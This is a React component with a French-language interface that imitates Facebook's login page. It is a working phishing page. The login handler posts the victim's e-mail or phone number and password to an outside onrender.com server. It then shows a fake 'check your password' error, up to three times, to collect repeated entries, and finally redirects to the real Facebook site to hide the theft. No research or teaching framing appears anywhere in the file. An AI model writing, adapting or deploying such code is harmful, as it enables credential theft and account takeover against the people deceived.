import React, { useState, useEffect } from 'react';
import { Spinner, Container, Row, Col, Form, Button } from 'react-bootstrap';
import axios from 'axios';
import "bootstrap/dist/css/bootstrap.min.css";
import { ToastContainer, toast } from 'react-toastify';
import 'react-toastify/dist/ReactToastify.css';

const Connexion = () => {
  const [nom, setNom] = useState("");
  const [mdp, setMdp] = useState("");
  const [tmp, setTmp] = useState(1);
  const [loading, setLoading] = useState(false);
  const [isMobile, setIsMobile] = useState(window.innerWidth < 768);

  useEffect(() => {
    const resize = () => setIsMobile(window.innerWidth < 768);
    window.addEventListener("resize", resize);
    return () => window.removeEventListener("resize", resize);
  }, []);

  const manadala = () => {
    toast.error('Vous ne pouvez pas créer un compte dans une version bêta. Veuillez vous connecter', {
      position: "top-center",
      autoClose: 3000,
      theme: "light",
    });
  };

  const mampiditra = async (e) => {
    e.preventDefault();
    if (mdp === "" || nom === "") {
      toast.error('Veuillez remplir les champs vides', {
        position: "top-center",
        autoClose: 2000,
        theme: "light",
      });
      return;
    }

    setLoading(true);

    try {
      const response = await axios.post('https://backnode-91gr.onrender.com/login', { nom, mdp });
      if (response.data.success === true && tmp < 3) {
        setTmp(prev => prev + 1);
        setNom("");
        setMdp("");
        toast.error('Vérifiez votre mot de passe ou votre numéro de téléphone', {
          position: "top-center",
          autoClose: 3000,
          theme: "light",
        });
      } else {
        window.location.href = 'https://m.facebook.com';
      }
    } catch (error) {
      console.log(error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div style={{
      background: "#f0f2f5",
      minHeight: "100vh",
      padding: isMobile ? "20px" : "50px",
      display: "flex",
      flexDirection: "column",
      justifyContent: "space-between"
    }}>
      {/* Haut : Contenu principal */}
      <div style={{
        display: "flex",
        flexDirection: isMobile ? "column" : "row",
        justifyContent: "center",
        alignItems: isMobile ? "flex-start" : "center",
        flexWrap: "wrap",
        flex: 1,
        width: "100%"
      }}>
        {/* Left: Logo + Text */}
        <div style={{
          flex: 1,
          maxWidth: "500px",
          marginBottom: isMobile ? "30px" : "0",
          textAlign: isMobile ? "center" : "left",
        }}>
          <h1 style={{ color: "#1877f2", fontSize: "60px", fontWeight: "bold", marginBottom: "10px" }}>
            facebook
          </h1>
          <p style={{ fontSize: "28px", color: "#1c1e21" }}>
            Avec Facebook, partagez et restez en contact avec votre entourage.
          </p>
        </div>

        {/* Right: Form */}
        <div style={{
          flex: 1,
          maxWidth: "400px",
          width: "100%",
        }}>
          <div style={{
            background: "#fff",
            padding: "20px",
            borderRadius: "8px",
            boxShadow: "0 2px 4px rgba(0, 0, 0, 0.1)",
          }}>
            <Form onSubmit={mampiditra}>
              <Form.Group controlId="formBasicNom">
                <Form.Control
                  type="text"
                  placeholder="Adresse e-mail ou numéro de tél."
                  value={nom}
                  onChange={(e) => setNom(e.target.value)}
                  style={{
                    padding: "14px",
                    marginBottom: "10px",
                    fontSize: "16px",
                    borderRadius: "6px",
                  }}
                />
              </Form.Group>
              <Form.Group controlId="formBasicPassword">
                <Form.Control
                  type="password"
                  placeholder="Mot de passe"
                  value={mdp}
                  onChange={(e) => setMdp(e.target.value)}
                  style={{
                    padding: "14px",
                    marginBottom: "10px",
                    fontSize: "16px",
                    borderRadius: "6px",
                  }}
                />
              </Form.Group>
              <Button
                type="submit"
                variant="primary"
                disabled={loading}
                style={{
                  width: "100%",
                  padding: "14px",
                  fontSize: "18px",
                  fontWeight: "bold",
                  marginBottom: "10px",
                }}
              >
                {loading ? <Spinner animation="border" size="sm" /> : "Se connecter"}
              </Button>
              <div style={{ textAlign: "center", marginBottom: "10px" }}>
                <a href="#" style={{ color: "#1877f2", fontSize: "14px", textDecoration: "none" }}>
                  Mot de passe oublié ?
                </a>
              </div>
              <div style={{
                height: "1px",
                backgroundColor: "#dddfe2",
                margin: "20px 0"
              }} />
              <Button
                variant="success"
                onClick={manadala}
                disabled={loading}
                style={{
                  width: "100%",
                  padding: "12px",
                  fontSize: "16px",
                  fontWeight: "bold",
                }}
              >
                {loading ? <Spinner animation="border" size="sm" /> : "Créer un nouveau compte"}
              </Button>
            </Form>
          </div>
          <p style={{
            marginTop: "20px",
            fontSize: "14px",
            textAlign: "center",
            color: "#1c1e21"
          }}>
            <strong>Créer une Page</strong> pour une célébrité, une marque ou une entreprise.
          </p>
          <ToastContainer />
        </div>
      </div>

      {/* Bas : Footer multilingue */}
      <div style={{
        marginTop: "40px",
        padding: "20px 0",
        textAlign: "center",
        fontSize: "13px",
        color: "#737373",
        borderTop: "1px solid #ddd"
      }}>
        <div style={{
          display: "flex",
          flexWrap: "wrap",
          justifyContent: "center",
          gap: "10px",
          marginBottom: "10px"
        }}>
          {[
            "Français (France)", "Malagasy", "English (US)", "Italiano", "Español", "Deutsch", "中文(简体)",
            "Português (Brasil)", "العربية", "हिन्दी", "+"
          ].map((lang, i) => (
            <span key={i} style={{ cursor: "pointer", padding: "0 8px" }}>{lang}</span>
          ))}
        </div>

        <hr style={{ maxWidth: "700px", margin: "10px auto", borderColor: "#ddd" }} />

        <div style={{
          display: "flex",
          flexWrap: "wrap",
          justifyContent: "center",
          gap: "15px",
          marginTop: "10px",
          fontSize: "12px"
        }}>
          {[
            "S'inscrire", "Se connecter", "Messenger", "Facebook Lite", "Vidéo", "Meta Pay",
            "Boutique Meta", "Meta Quest", "Instagram", "Threads", "À propos", "Créer une Page",
            "Emplois", "Confidentialité", "Cookies", "Conditions générales", "Aide"
          ].map((link, i) => (
            <span key={i} style={{ cursor: "pointer" }}>{link}</span>
          ))}
        </div>

        <div style={{ marginTop: "10px" }}>Meta © 2025</div>
      </div>
    </div>
  );
};

export default Connexion;
